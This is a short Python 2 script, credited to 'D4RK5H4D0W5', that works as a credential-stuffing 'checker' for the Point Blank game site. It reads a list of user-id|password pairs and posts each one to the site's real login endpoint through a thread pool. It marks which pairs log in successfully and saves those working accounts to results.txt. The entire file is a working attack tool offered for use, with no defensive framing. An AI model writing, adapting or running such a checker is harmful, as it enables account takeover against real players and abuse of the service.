#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
#JANGAN HAPUS NAMA AUTHOR YA ANJENG !
C0 = "\033[0;36m"
C1 = "\033[1;36m"
G0 = "\033[0;32m"
G1 = "\033[1;32m"
W0 = "\033[0;37m"
W1 = "\033[1;37m"
R0 = "\033[0;31m"
R1 = "\033[1;31m"

import requests, os, sys
from multiprocessing.pool import ThreadPool

def cek(up):
	try:
		web=requests.post('https://www.pointblank.id/login/process',data={'loginFail':'0','userid':up.split('|')[0],'password':up.split('|')[1]})
		if 'tidak sesuai' in web.text:
			print '%s[ %sDIEE %s] %s'%(W0,R0,W0,up)
		elif 'kegagalan login' in web.text:
			print '%s[ %sDIEE %s] %s'%(W0,R0,W0,up)
		else:
			print '%s[ %sLIVE %s] %s'%(W0,G0,W0,up)
			open('results.txt','a+').write(up+'\n')
	except:
		pass

try:
	os.system('clear')
	print '''%s
   ___      ___
  / _ \    / _ )        %sCoded by D4RKSH4D0WS%s
 / ___/   / _  |        %sPoint Blank Checker%s
/_/ oint /____/ lank    %swa.me/628996604524
'''%(C1,W0,C1,W0,C1,W0)
	ThreadPool(2).map(cek,open(sys.argv[1]).read().splitlines())
	print '\n%s[ %sDONE %s] Saved in results.txt'%(W0,G0,W0)
except requests.exceptions.ConnectionError:
	exit('%s[%s!%s] %sCheck internet'%(W1,R1,W1,W0))
except IndexError:
	exit('%s[%s!%s] %sUse : python2 %s target.txt \n%s[%s!%s] %sFill in target.txt as follows user-id|password'%(W1,R1,W1,W0,sys.argv[0],W1,R1,W1,W0))
except IOError:
	exit('%s[%s!%s] %sFile does not exist'%(W1,R1,W1,W0))
except KeyboardInterrupt:
	exit('\n%s[%s!%s] %sExit'%(W1,R1,W1,W0))
